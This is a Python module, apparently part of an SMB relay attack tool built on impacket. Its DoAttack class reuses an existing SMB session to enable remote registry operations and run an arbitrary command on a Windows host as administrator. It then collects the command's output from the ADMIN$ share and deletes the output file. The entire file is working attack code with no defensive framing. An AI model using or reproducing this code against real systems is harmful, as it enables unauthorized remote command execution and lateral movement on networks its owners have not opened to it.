# -*- coding: utf-8 -*-

from impacket.smb import SMB
from impacket.smbconnection import SMBConnection
# from threading import Thread

from .secretsdump import RemoteOperations


class DoAttack(object):
    # class DoAttack(Thread):

    def __init__(self, SMBClient, command):
        # Thread.__init__(self)

        self.__SMBConnection = SMBConnection(existingConnection=SMBClient)
        self.__command = command
        self.__answerTMP = ''

    def __answer(self, data):
        self.__answerTMP += data

    def run(self):
        try:
            # We have to add some flags just in case the original client did not
            # Why? needed for avoiding INVALID_PARAMETER
            flags1, flags2 = self.__SMBConnection.getSMBServer().get_flags()
            flags2 |= SMB.FLAGS2_LONG_NAMES
            self.__SMBConnection.getSMBServer().set_flags(flags2=flags2)

            remoteOps = RemoteOperations(self.__SMBConnection, False)
            remoteOps.enableRegistry()
        except Exception as e:
            # Something wen't wrong, most probably we don't have access as admin. aborting
            print(str(e))
            return False

        try:
            remoteOps._RemoteOperations__executeRemote(self.__command)
            # print("Executed specified command on host: %s" % self.__SMBConnection.getRemoteHost())
            self.__answerTMP = ''
            self.__SMBConnection.getFile('ADMIN$', 'Temp\\__output', self.__answer)
            self.__SMBConnection.deleteFile('ADMIN$', 'Temp\\__output')

        except Exception as e:
            print(str(e))
            self.__answerTMP = 'ERROR'
        finally:
            if remoteOps is not None:
                remoteOps.finish()

        return self.__answerTMP
